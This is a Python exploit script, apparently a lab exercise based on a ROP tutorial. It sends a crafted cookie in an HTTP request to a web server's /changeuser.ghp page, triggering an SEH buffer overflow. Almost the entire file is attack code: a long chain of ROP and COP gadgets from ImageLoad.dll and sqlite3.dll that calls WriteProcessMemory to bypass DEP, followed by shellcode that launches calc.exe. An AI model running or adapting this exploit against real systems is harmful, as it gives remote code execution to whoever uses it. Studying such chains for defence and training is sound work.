#based on https://connormcgarr.github.io/ROP2/

import sys
import os
import socket
import struct

CRASH = 5000
OFFSET_SEH = 2499
OFFSET_ADD = 4063

payload = b"\x90" * OFFSET_SEH
#

# add esp, 0x1004 ATTERRA QUI
#Salvo EBP in EAX erchè è il più vicino ad ESP
payload += struct.pack("<I",0x61c05e8c)  # XCHG EAX,EBP # RETN 

#Poppo  -4128 in ECX e lo sottraggo ad EAX 
# EAX is now 0xfec bytes away from ESP. We want current ESP + 0x28 
#(to compensate for loading EAX into ECX eventually) into EAX
# Popping negative ESP + 0x28 into ECX and subtracting from EAX
# EAX will now contain a value at ESP + 0x24 (loading ESP + 0x24 into EAX, as this value will be placed in EBP eventually. EBP will then be placed into ESP - which will compensate for ROP gadget which moves EAX into EAX vai "leave")
payload += struct.pack("<I",0x10018606)  # POP ECX # RETN    ** [ImageLoad.dll] **
payload += struct.pack("<I",0xffffefe0)  #? -(esp - eax + 38) -> -(4072 +38)
payload += struct.pack("<I",0x1001283e) # sub eax, ecx ; ret   

# This gadget is to get EBP equal to EAX (which is further down on the stack)
#  - due to the mov eax, ecx ROP gadget that eventually will occur.
# Said ROP gadget has a "leave" instruction, which will load EBP into ESP. 
#This ROP gadget compensates for this gadget to make sure the stack doesn't get corrupted, by just "hopping" down the stack
# EAX and ECX will now equal ESP - 8 - which is good enough in terms of needing EAX and ECX 
#to be "values around the stack"
payload += struct.pack("<I",0x61c30547) #add ebp, eax ; ret  ;  (1 found)
payload += struct.pack("<I",0x61c6588d) #mov ecx, eax ; mov eax, ecx ; add esp, 0x24 ; pop ebx ; leave  ; ret  ;  (1 found)
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget (pop ebx)
payload += struct.pack('<L', 0x90909090)    # Padding to compensate for above ROP gadget (pop ebp in leave instruction)

# Jumping over kernel32!WriteProcessMemory placeholder parameters
payload += struct.pack('<L', 0x10015eb4)    # add esp, 0x1c ; ret: ImageLoad.dll (non-ASLR enabled module)


# kernel32!WriteProcessMemory placeholder parameters
payload += struct.pack('<L', 0x61C832E4)    # Pointer to kernel32!WriteFile (no pointers from IAT directly to kernel32!WriteProcessMemory, so loading pointer to kernel32.dll and compensating later.)
payload += struct.pack('<L', 0x61c72d10)    # RX from sqlite3.dll
payload += struct.pack('<L', 0xFFFFFFFF)    # hProccess = handle to current process (Pseudo handle = 0xFFFFFFFF points to current process)
payload += struct.pack('<L', 0x61c72d10)    # lpBaseAddress = RX in sqlite3.dll
payload += struct.pack('<L', 0x11111111)    # lpBuffer = base address of shellcode (dynamically generated)
payload += struct.pack('<L', 0x22222222)    # nSize = size of shellcode 
payload += struct.pack('<L', 0x1004dd10)    # lpNumberOfBytesWritten = writable location RW in imageload.dll


#lpBuffer
# ECX currently points to lpBuffer placeholder parameter location - 0x18
# Moving ECX 8 bytes before EAX, as the gadget to overwrite dword ptr [ecx] overwrites it at an offset of ecx+0x8
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001dacc)    # inc ecx ; clc ; mov edx, dword [ecx-0x04] ; ret: ImageLoad.dll (non-ASLR enabled module)

#EAX -> [ECX+8]
#ora metto 300 in ESI e poi lo sottgraggo ad EAX (che vale ESP - 8). 
#Copio poi il valore in ECX + 8
payload += struct.pack('<L', 0x1001fce9)    # pop esi ; add esp + 0x8 ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0xfffffd44)    # Shellcode is about negative 0xfffffd44 (0x2dc) bytes away from EAX
payload += struct.pack('<L', 0x90909090)    # Compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Compensate for above ROP gadget
payload += struct.pack('<L', 0x10022f45)    # sub eax, esi ; pop edi ; pop esi ; ret
payload += struct.pack('<L', 0x90909090)    # Compensate for above ROP gadget
payload += struct.pack('<L', 0x90909090)    # Compensate for above ROP gadget 
#effective copy
payload += struct.pack('<L', 0x10021bfb)    # MOV DWORD PTR [ECX+8],EAX # RETN    ** [ImageLoad.dll] **

#nsize - 512
payload += struct.pack('<L', 0x100161e6)  # POP EDI # RETN    ** [ImageLoad.dll] ** 
payload += struct.pack('<L', 0x1001c16f)    # add esp, 0x8 ; ret: ImageLoadl.dll (non-ASLR enabled module) (Returns to stack after COP gadget)
payload += struct.pack('<L', 0x10022c4c)    # xor edx, edx ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
#increase ECX to point to nsize
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
#EDX -> [ECX]
payload += struct.pack('<L',0x1001f5b4)  # MOV DWORD PTR [ECX],EDX # RETN    ** [ImageLoad.dll] **  

# kernel32!WriteProcessMemory
#decrease ecx di 20 = placeholder VirtualProtect
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
#edx to 260
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
payload += struct.pack('<L', 0x1001b884)    # add edx, 0x20 ; push edx ; call edi: ImageLoad.dll (non-ASLR enabled module) (COP gadget)
# eax - edx = placeholder VirtualProtect
payload += struct.pack('<L',0x10015ce5) # SUB EAX,EDX # RETN    ** [ImageLoad.dll] ** 
#[EAX] -> EAX && [EAX] -> EAX
payload += struct.pack('<L',0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** 
payload += struct.pack('<L',0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** 
#
payload += struct.pack('<L', 0x10022c4c)    # xor edx, edx ; ret: ImageLoad.dll (non-ASLR enabled module)
payload += struct.pack('<L',0x100141c8)  # POP EBX # RETN    ** [ImageLoad.dll] ** 
payload += struct.pack('<L',0xfffec5c0)  #
payload += struct.pack('<L',0x10022c1e)  # ADD EDX,EBX # POP EBX # RETN 0x10    **
payload += struct.pack('<L', 0x90909090) # padding for pop ebx
payload += struct.pack('<L',0x10015ce5)  # SUB EAX,EDX # RETN    ** [ImageLoad.dll] **
payload += struct.pack('<L', 0x90909090) # padding for retn10
payload += struct.pack('<L', 0x90909090) # padding for retn10
payload += struct.pack('<L', 0x90909090) # padding for retn10
payload += struct.pack('<L', 0x90909090) # padding for retn10
#decrease ecx by 8
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
payload += struct.pack("<I",0x61c0555f)  # DEC ECX # RETN    ** [sqlite3.dll] **
#EAX -> [ECX+8]
payload += struct.pack('<L', 0x10021bfb)    # MOV DWORD PTR [ECX+8],EAX # RETN    ** [ImageLoad.dll] **

#ECX to ESP
#ecx + 8
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **
payload += struct.pack('<L', 0x61c68081)  # INC ECX # ADD AL,39 # RETN  ** [sqlite3.dll] **

payload += struct.pack("<I",0x1001fa0d) # mov eax,ecx; retn imageload.dll
payload += struct.pack("<I",0x61c07ff8)  # XCHG EAX,ESP # RETN    ** [sqlite3.dll] **

payload += b"\x90" * 230

#calc.exe x86 w10
shellcode = b"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"  


payload += shellcode

payload += b"B" * (OFFSET_ADD-len(payload))
payload += struct.pack('<L', 0x10022869)    # add esp, 0x1004 ; ret: NSEH
payload += b"C" * (CRASH - len(payload))

#print((payload))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = b"GET /changeuser.ghp HTTP/1.1\r\n"
http_request += b"Host: 172.16.55.140\r\n"
http_request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += b"Accept-Language: en-US,en;q=0.5\r\n"
http_request += b"Accept-Encoding: gzip, deflate\r\n"
http_request += b"Referer: http://172.16.55.140/\r\n"
http_request += b"Cookie: SESSIONID=9349; UserID=" + payload + b"; PassWD=;\r\n"
http_request += b"Connection: Close\r\n"
http_request += b"Upgrade-Insecure-Requests: 1\r\n"

print("[+] Sending exploit...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
s.send(http_request)
s.close()
